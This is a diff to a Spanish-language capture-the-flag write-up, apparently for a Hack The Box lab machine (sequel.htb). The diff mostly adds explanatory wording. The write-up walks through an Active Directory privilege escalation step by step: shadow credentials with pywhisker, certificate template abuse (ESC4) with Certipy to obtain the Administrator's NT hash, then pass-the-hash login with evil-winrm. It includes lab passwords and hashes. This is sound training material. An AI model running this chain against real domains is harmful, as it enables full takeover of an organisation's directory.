@@ -310,47 +310,49 @@ Añadimos las shadow credentials a `ca_svc` usando [[PYWISKER]]
 pywhisker -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' --target ca_svc --action add
 ```
 
-Obtenemos el hash con la información obtenida y las pasamos a [[CERTIPY]]
+Obtenemos LA contraseña  y las pasamos a [[CERTIPY]]
 ```shell
 certipy auth -pfx zX5kmYs5.pfx -password u35mJEVwQSjQTFnmBNSl -username ca_svc -domain sequel.htb -dc-ip 10.129.232.128
 ```
 
+Obteniendo así el hash de `ca_svc`
 ```c++
 [*] Got hash for 'ca_svc@sequel.htb': aad3b435b51404eeaad3b435b51404ee:3b181b914e7a9d5508ea1e20bc2b7fce
 ```
 
-
-Vemos si tiene alguna vulnerabilidad
+Vemos si tiene alguna vulnerabilidad usando [[CERTIPY]]
 ```shell
 certipy find -u 'ca_svc@sequel.htb' -hashes aad3b435b51404eeaad3b435b51404ee:3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.232.128 -vulnerable -stdout
 ```
 
+Y observamos que es vulnerable a [[#Abusing ESC4]]
 ```C++
 [!] Vulnerabilities ESC4: User has dangerous permissions.
 ```
 
 ### Abusing ESC4
 
-Usamos la versión de Certipy 5.0.4
+Usamos la versión de Certipy 5.0.4 con el hash y la plantilla que queremos cargar usando [[CERTIPY]]
 ```shell
 certipy template -dc-ip 10.129.232.128 -u ca_svc -hashes aad3b435b51404eeaad3b435b51404ee:3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -target sequel.htb -write-default-configuration
 ```
 
-Obtennos el certificado del usuario `Administrador` y nos lo traemos a nuestra maquina
+Obtennos el certificado del usuario `Administrador` y nos lo traemos a nuestra maquina con [[CERTIPY]]
 ```shell
 certipy req -u 'ca_svc@sequel.htb' -hashes aad3b435b51404eeaad3b435b51404ee:3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb
 ```
 
-Nos autenticamos con este certificado para obtener el hash
+Nos autenticamos con este certificado para obtener el hash usando [[CERTIPY]]
 ```shell
 certipy auth -pfx administrator_3c00b508-04c8-48be-9ba2-cc00b7af5fb0.pfx -dc-ip 10.129.232.128
 ```
 
+Obtenemos el hash del usuario `Administrador`
 ```c++
 [*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
 ```
 
-Nos conectamos al usuario `Administrador` con el hash obtenido
+Nos conectamos al usuario `Administrador` con el hash obtenido usando [[EVIL-WINRM]]
 ```shell
 evil-winrm -i 10.129.232.128 -u administrator -H '7a8d4e04986afa8ed4060f75e5a0b3ff'
 ```
